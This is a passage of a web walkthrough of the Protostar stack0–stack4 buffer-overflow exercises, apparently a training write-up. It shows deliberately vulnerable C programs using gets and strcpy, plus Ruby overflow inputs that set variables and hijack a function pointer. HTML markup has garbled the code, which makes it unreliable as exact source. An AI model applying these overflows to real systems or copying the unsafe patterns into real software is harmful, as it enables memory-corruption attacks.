</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">you</span> <span class="n">have</span> <span class="n">changed</span> <span class="n">the</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">modified</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="n">variable</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Try</span> <span class="n">again</span><span class="o">?</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e &lsquo;print &ldquo;\xfa&rdquo; * 64&rsquo; | ./stack0
</span><span class='line'>Try again?&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/opt/protostar/bin$ ruby -e &lsquo;print &ldquo;\xfa&rdquo; * 64 + &ldquo;\x01&rdquo;&rsquo; | ./stack0
</span><span class='line'>you have changed the &lsquo;modified&rsquo; variable</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Stack1</h2>

<p><figure class='code'><figcaption><span>stack1.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">please</span> <span class="n">specify</span> <span class="n">an</span> <span class="n">argument</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x61626364</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">you</span> <span class="n">have</span> <span class="n">correctly</span> <span class="n">got</span> <span class="n">the</span> <span class="n">variable</span> <span class="n">to</span> <span class="n">the</span> <span class="n">right</span> <span class="n">value</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Try</span> <span class="n">again</span><span class="p">,</span> <span class="n">you</span> <span class="n">got</span> <span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="mi">08</span><span class="n">x</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">modified</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e &lsquo;print &ldquo;X&rdquo; * 64&rsquo;)
</span><span class='line'>Try again, you got 0x00000000&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e &lsquo;print &ldquo;X&rdquo; * 64 + [0x41414141].pack(&ldquo;V&rdquo;) &rsquo;)
</span><span class='line'>Try again, you got 0x41414141&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e &lsquo;print &ldquo;X&rdquo; * 64 + [0x61626364].pack(&ldquo;V&rdquo;) &rsquo;)
</span><span class='line'>you have correctly got the variable to the right value</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Stack2</h2>

<p><figure class='code'><figcaption><span>stack2.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;*</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">variable</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">variable</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">GREENIE</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">variable</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">please</span> <span class="n">set</span> <span class="n">the</span> <span class="n">GREENIE</span> <span class="n">environment</span> <span class="n">variable</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">variable</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x0d0a0d0a</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">you</span> <span class="n">have</span> <span class="n">correctly</span> <span class="n">modified</span> <span class="n">the</span> <span class="n">variable</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Try</span> <span class="n">again</span><span class="p">,</span> <span class="n">you</span> <span class="n">got</span> <span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="mi">08</span><span class="n">x</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">modified</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ./stack2
</span><span class='line'>stack2: please set the GREENIE environment variable&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/opt/protostar/bin$ GREENIE=$(ruby -e &lsquo;print &ldquo;A&rdquo; * 64 + [0x41414141].pack(&ldquo;V&rdquo;)&rsquo;) ./stack2
</span><span class='line'>Try again, you got 0x41414141&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/opt/protostar/bin$ GREENIE=$(ruby -e &lsquo;print &ldquo;A&rdquo; * 64 + [0x0d0a0d0a].pack(&ldquo;V&rdquo;)&rsquo;) ./stack2
</span><span class='line'>you have correctly modified the variable</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Stack3</h2>

<p><figure class='code'><figcaption><span>stack3.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">win</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">code</span> <span class="n">flow</span> <span class="n">successfully</span> <span class="n">changed</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;*</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="p">(</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">fp</span><span class="p">)();</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">fp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">calling</span> <span class="n">function</span> <span class="n">pointer</span><span class="p">,</span> <span class="n">jumping</span> <span class="n">to</span> <span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="mi">08</span><span class="n">x</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">fp</span><span class="p">);</span>
</span><span class='line'>      <span class="n">fp</span><span class="p">();</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We need to rewrite fp function address with the address of win().
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e &lsquo;print &ldquo;X&rdquo; * 64 + [0x41414141].pack(&ldquo;V&rdquo;)&rsquo; | ./stack3
</span><span class='line'>calling function pointer, jumping to 0x41414141
</span><span class='line'>Segmentation fault&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/opt/protostar/bin$ nm ./stack3 | grep win
</span><span class='line'>08048424 T win&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/opt/protostar/bin$ ruby -e &lsquo;print &ldquo;X&rdquo; * 64 + [0x08048424].pack(&ldquo;V&rdquo;)&rsquo; | ./stack3
</span><span class='line'>calling function pointer, jumping to 0x08048424
</span><span class='line'>code flow successfully changed</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Stack4</h2>

<p><figure class='code'><figcaption><span>stack4.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">win</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">code</span> <span class="n">flow</span> <span class="n">successfully</span> <span class="n">changed</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We use metasploit patterns (on Kali Linux) to determine the exact location of stored EIP:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>Window 1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_create.rb 80
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>Window 2:&lt;/h1>
</span><span class='line'>
